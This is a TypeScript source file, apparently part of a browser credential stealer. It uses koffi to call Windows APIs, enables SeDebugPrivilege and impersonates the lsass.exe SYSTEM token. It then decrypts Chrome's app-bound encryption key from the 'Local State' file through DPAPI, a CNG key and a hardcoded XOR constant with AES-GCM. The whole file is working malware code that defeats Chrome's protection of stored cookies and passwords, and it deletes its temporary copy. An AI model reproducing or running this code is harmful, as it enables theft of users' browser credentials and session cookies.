import koffi from 'koffi';
import crypto from 'crypto';
import fs from 'fs';
import path from 'path';


const HANDLE = koffi.pointer('void');
const PHANDLE = koffi.pointer(HANDLE);
const PBYTE = koffi.pointer('uint8_t');
const LPDWORD = koffi.pointer('uint32_t');

const LUID = koffi.struct({
    LowPart: 'uint32_t',
    HighPart: 'int32_t'
});
const LUID_AND_ATTRIBUTES = koffi.struct({
    Luid: LUID,
    Attributes: 'uint32_t'
});
const TOKEN_PRIVILEGES = koffi.struct({
    PrivilegeCount: 'uint32_t',
    Privileges: koffi.array(LUID_AND_ATTRIBUTES, 1)
});
const DATA_BLOB = koffi.struct({
    cbData: 'uint32_t',
    pbData: PBYTE
});
const PDATA_BLOB = koffi.pointer(DATA_BLOB);

const TH32CS_SNAPPROCESS = 0x00000002;
const PROCESSENTRY32 = koffi.struct({
    dwSize: 'uint32_t',
    cntUsage: 'uint32_t',
    th32ProcessID: 'uint32_t',
    th32DefaultHeapID: 'uintptr_t',
    th32ModuleID: 'uint32_t',
    cntThreads: 'uint32_t',
    th32ParentProcessID: 'uint32_t',
    pcPriClassBase: 'int32_t',
    dwFlags: 'uint32_t',
    szExeFile: koffi.array('char', 260)
});

const kernel32 = koffi.load('kernel32.dll');
const advapi32 = koffi.load('advapi32.dll');
const crypt32 = koffi.load('crypt32.dll');
const ncrypt = koffi.load('ncrypt.dll');

const SE_PRIVILEGE_ENABLED = 0x00000002;

const GetCurrentProcess = kernel32.func('__stdcall', 'GetCurrentProcess', HANDLE, []);
const LookupPrivilegeValueA = advapi32.func('__stdcall', 'LookupPrivilegeValueA', 'int', ['str', 'str', koffi.pointer(LUID)]);
const AdjustTokenPrivileges = advapi32.func('__stdcall', 'AdjustTokenPrivileges', 'int', [HANDLE, 'int', koffi.pointer(TOKEN_PRIVILEGES), 'uint32_t', 'void*', 'void*']);
const SetThreadToken = advapi32.func('__stdcall', 'SetThreadToken', 'int', [HANDLE, HANDLE]);
const DuplicateToken = advapi32.func('__stdcall', 'DuplicateToken', 'int', [HANDLE, 'int', PHANDLE]);
const CryptUnprotectData = crypt32.func('__stdcall', 'CryptUnprotectData', 'int', [PDATA_BLOB, 'void*', 'void*', 'void*', 'void*', 'uint32_t', PDATA_BLOB]);
const GetLastError = kernel32.func('__stdcall', 'GetLastError', 'uint32_t', []);

const CreateToolhelp32Snapshot = kernel32.func('__stdcall', 'CreateToolhelp32Snapshot', HANDLE, ['uint32_t', 'uint32_t']);
const Process32First = kernel32.func('__stdcall', 'Process32First', 'int', [HANDLE, koffi.pointer(PROCESSENTRY32)]);
const Process32Next = kernel32.func('__stdcall', 'Process32Next', 'int', [HANDLE, koffi.pointer(PROCESSENTRY32)]);
const OpenProcess = kernel32.func('__stdcall', 'OpenProcess', HANDLE, ['uint32_t', 'int', 'uint32_t']);
const CloseHandle = kernel32.func('__stdcall', 'CloseHandle', 'int', [HANDLE]);

const NCryptOpenStorageProvider = ncrypt.func('__stdcall', 'NCryptOpenStorageProvider', 'int', [PHANDLE, 'str16', 'uint32_t']);
const NCryptOpenKey = ncrypt.func('__stdcall', 'NCryptOpenKey', 'int', [HANDLE, PHANDLE, 'str16', 'uint32_t', 'uint32_t']);
const NCryptDecrypt = ncrypt.func('__stdcall', 'NCryptDecrypt', 'int', [HANDLE, PBYTE, 'uint32_t', 'void*', PBYTE, 'uint32_t', LPDWORD, 'uint32_t']);
const NCryptFreeObject = ncrypt.func('__stdcall', 'NCryptFreeObject', 'int', [HANDLE]);


const OpenProcessToken = advapi32.func('__stdcall', 'OpenProcessToken', 'int', [HANDLE, 'uint32_t', PHANDLE]);
const DuplicateTokenEx = advapi32.func('__stdcall', 'DuplicateTokenEx', 'int', [HANDLE, 'uint32_t', 'void*', 'int', 'int', PHANDLE]);

function enablePrivilege(privilegeName: string): boolean {
    const hProcess = GetCurrentProcess();
    const hTokenBuf = Buffer.alloc(8);

    if (!OpenProcessToken(hProcess, 0x0028, hTokenBuf)) {
        return false;
    }
    const hToken = koffi.decode(hTokenBuf, HANDLE);

    const luid = { LowPart: 0, HighPart: 0 };
    const luidBuf = Buffer.alloc(koffi.sizeof(LUID));

    if (!LookupPrivilegeValueA(null, privilegeName, luidBuf)) {
        CloseHandle(hToken);
        return false;
    }
    const luidVal = koffi.decode(luidBuf, LUID);

    const tp = {
        PrivilegeCount: 1,
        Privileges: [{
            Luid: luidVal,
            Attributes: SE_PRIVILEGE_ENABLED
        }]
    };

    const success = AdjustTokenPrivileges(hToken, 0, tp, 0, null, null);
    const lastError = GetLastError();

    CloseHandle(hToken);

    if (!success) {
        return false;
    }

    if (lastError === 1300) {
        return false;
    }

    return true;
}

function getLsassPid(): number | null {
    const hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (!hSnapshot) return null;

    const peSize = koffi.sizeof(PROCESSENTRY32);
    const peBuf = Buffer.alloc(peSize);
    peBuf.writeUInt32LE(peSize, 0);

    let pid: number | null = null;
    if (Process32First(hSnapshot, peBuf)) {
        do {
            const pe = koffi.decode(peBuf, PROCESSENTRY32);
            const exeName = Buffer.from(pe.szExeFile).toString().split('\0')[0];
            if (exeName.toLowerCase() === 'lsass.exe') {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, peBuf));
    }
    CloseHandle(hSnapshot);
    return pid;
}

export function impersonateLsass(): boolean {
    const privRes = enablePrivilege("SeDebugPrivilege");

    const pid = getLsassPid();
    if (!pid) {
        return false;
    }

    const hProcess = OpenProcess(0x1000, 0, pid);

    if (!hProcess) {
        return false;
    }

    const hTokenBuf = Buffer.alloc(8);
    if (!OpenProcessToken(hProcess, 0x000A, hTokenBuf)) {
        CloseHandle(hProcess);
        return false;
    }
    const hToken = koffi.decode(hTokenBuf, HANDLE);

    const hDupTokenBuf = Buffer.alloc(8);

    const dupRes = DuplicateTokenEx(
        hToken,
        0x02000000,
        null,
        2,
        2,
        hDupTokenBuf
    );

    if (!dupRes) {
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return false;
    }
    const hDupToken = koffi.decode(hDupTokenBuf, HANDLE);

    const res = SetThreadToken(null, hDupToken);

    CloseHandle(hDupToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);
    return !!res;
}

export function revertImpersonation() {
    SetThreadToken(null, null);
}

function decryptSystemDPAPI(encryptedData: Buffer): Buffer | null {
    if (!encryptedData || encryptedData.length === 0) return null;
    const dataIn = { cbData: encryptedData.length, pbData: encryptedData };
    const dataOutBuf = Buffer.alloc(koffi.sizeof(DATA_BLOB));
    const cryptRes = CryptUnprotectData(dataIn, null, null, null, null, 0, dataOutBuf);
    if (cryptRes) {
        const dataOut = koffi.decode(dataOutBuf, DATA_BLOB);
        const res = koffi.decode(dataOut.pbData, 'uint8_t', dataOut.cbData);
        return Buffer.from(res);
    }
    return null;
}


function decryptWithCNG(data: Buffer): Buffer | null {
    const hProviderBuf = Buffer.alloc(8);
    const status1 = NCryptOpenStorageProvider(hProviderBuf, "Microsoft Software Key Storage Provider", 0);
    if (status1 !== 0) {
        return null;
    }
    const hProvider = koffi.decode(hProviderBuf, HANDLE);

    const hKeyBuf = Buffer.alloc(8);
    const status2 = NCryptOpenKey(hProvider, hKeyBuf, "Google Chromekey1", 0, 0);
    if (status2 !== 0) {
        NCryptFreeObject(hProvider);
        return null;
    }
    const hKey = koffi.decode(hKeyBuf, HANDLE);

    const sizeBuf = Buffer.alloc(4);
    const dataPtr = data;
    const status3 = NCryptDecrypt(hKey, dataPtr, data.length, null, null, 0, sizeBuf, 0x40);
    if (status3 !== 0) {
        NCryptFreeObject(hKey); NCryptFreeObject(hProvider); return null;
    }

    const size = sizeBuf.readUInt32LE(0);

    if (size === 0) {
        NCryptFreeObject(hKey); NCryptFreeObject(hProvider); return null;
    }

    const outBuffer = Buffer.alloc(size);
    const status4 = NCryptDecrypt(hKey, dataPtr, data.length, null, outBuffer, size, sizeBuf, 0x40);
    if (status4 !== 0) {
        NCryptFreeObject(hKey); NCryptFreeObject(hProvider); return null;
    }

    NCryptFreeObject(hKey);
    NCryptFreeObject(hProvider);

    const result = outBuffer.slice(0, sizeBuf.readUInt32LE(0));
    return result;
}

function xorBuffer(a: Buffer, b: Buffer): Buffer {
    const res = Buffer.alloc(a.length);
    for (let i = 0; i < a.length; i++) res[i] = a[i] ^ b[i];
    return res;
}
function deriveKey(blob: Buffer): Buffer | null {
    let offset = 0;
    const headerLen = blob.readUInt32LE(offset);
    offset += 4;
    offset += headerLen;

    const contentLen = blob.readUInt32LE(offset);
    offset += 4;

    const flag = blob[offset];
    offset += 1;

    if (flag === 3) {
        const encryptedAesKey = blob.slice(offset, offset + 32); offset += 32;
        const iv = blob.slice(offset, offset + 12); offset += 12;
        const ciphertext = blob.slice(offset, offset + 32); offset += 32;
        const tag = blob.slice(offset, offset + 16); offset += 16;


        let decryptedAesKey: Buffer | null = null;
        try {
            decryptedAesKey = decryptWithCNG(encryptedAesKey);
            if (!decryptedAesKey) {
                return null;
            }
        } catch (e: any) {
            return null;
        }
        const xorKey = Buffer.from("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390", "hex");
        const finalKey = xorBuffer(decryptedAesKey, xorKey);
        const decipher = crypto.createDecipheriv('aes-256-gcm', finalKey, iv);
        decipher.setAuthTag(tag);
        try {
            return Buffer.concat([decipher.update(ciphertext), decipher.final()]);

        } catch (e) {
            return null;
        }
    }
    return null;
}


function copyFileWithPermissions(sourcePath: string): string | null {
    try {
        const tempDir = path.join(process.env.TEMP || process.env.TMP || 'C:\\Windows\\Temp', 'browser_temp');
        if (!fs.existsSync(tempDir)) {
            fs.mkdirSync(tempDir, { recursive: true });
        }

        const tempFilePath = path.join(tempDir, `LocalState_${Date.now()}.tmp`);

        fs.copyFileSync(sourcePath, tempFilePath);

        fs.chmodSync(tempFilePath, 0o666);

        return tempFilePath;
    } catch (e) {
        return null;
    }
}
export async function getAppBoundKey(browserPath: string): Promise<Buffer | null> {
    let tempFilePath: string | null = null;
    try {
        const localStatePath = path.join(browserPath, 'Local State');
        if (!fs.existsSync(localStatePath)) return null;

        tempFilePath = copyFileWithPermissions(localStatePath);
        if (!tempFilePath) return null;

        const localState = JSON.parse(fs.readFileSync(tempFilePath, 'utf8'));
        const encryptedKeyB64 = localState.os_crypt?.app_bound_encrypted_key;

        if (!encryptedKeyB64) return null;

        const encryptedKey = Buffer.from(encryptedKeyB64, 'base64');
        if (encryptedKey.slice(0, 4).toString() !== 'APPB') return null;

        const ciphertext = encryptedKey.slice(4);
        let finalKey: Buffer | null = null;

        if (impersonateLsass()) {
            try {
                const outerDecrypted = decryptSystemDPAPI(ciphertext);
                if (outerDecrypted) {
                    const innerDecrypted = decryptSystemDPAPI(outerDecrypted);
                    if (innerDecrypted) {
                        finalKey = deriveKey(innerDecrypted);
                    }
                }
            } finally {
                revertImpersonation();
            }
        }

        return finalKey;

    } catch (e) {
        return null;
    } finally {
        if (tempFilePath && fs.existsSync(tempFilePath)) {
            try { fs.unlinkSync(tempFilePath); } catch (e) { }
        }
    }
}